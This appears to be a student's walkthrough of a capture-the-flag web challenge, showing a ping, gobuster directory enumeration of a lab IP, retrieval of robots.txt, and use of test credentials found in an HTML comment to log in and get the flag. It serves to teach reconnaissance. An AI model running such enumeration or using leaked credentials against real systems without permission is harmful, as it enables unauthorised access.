#Step 1


Ping target ip
```
	bash
ping <target ip>
```

Ping sucessfull

#Step 2

Find other directories on the backend

```
	bash 
gobuster dir -u http://83.136.252.57:54764/ -w /usr/share/dirb/wordlists/common.txt
```

This command calls gobuster with the dir switch and passes the target system with the ip and port number along with a word list that commons preinstalled on kali 
Below is the output of the command.

Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/index.php            (Status: 200) [Size: 990]
/robots.txt           (Status: 200) [Size: 45]
/server-status        (Status: 403) [Size: 281]
/wordpress            (Status: 301) [Size: 327] [--> http://83.136.252.57:54764/wordpress/]
Progress: 4614 / 4615 (99.98%)


We can see from the http codes that only index.php and robots.txt are directoryly avaible on this server. /wordpress is also availabe but 301 indicates that the location has been moved and my request will be redirected.


#Step 3

Get robots.txt 

	──(davidingraham㉿kaliVm)-[~]
└─$ curl http://83.136.252.57:54764/robots.txt
User-agent: *
Disallow: /admin-login-page.php

#Step 4

Visit the http://83.136.252.57:54764/admin-login-page.php
Inspect the page source to reveal the follwing html

```
	html

<div class="container">
                <label for="username"><b>Username</b></label>
                <input name="username" placeholder="Username" type="text">

                <label for="password"><b>Password</b></label>
                <input name="password" placeholder="Password" type="password">

                <!-- TODO: remove test credentials admin:password123 -->

                <button type="submit" formmethod="post">Login</button>
            </div>
```



We see a comment the developer left with the login credentials to the page. We use these credentials to login and visit a page that reveals the flag.                                                                                        
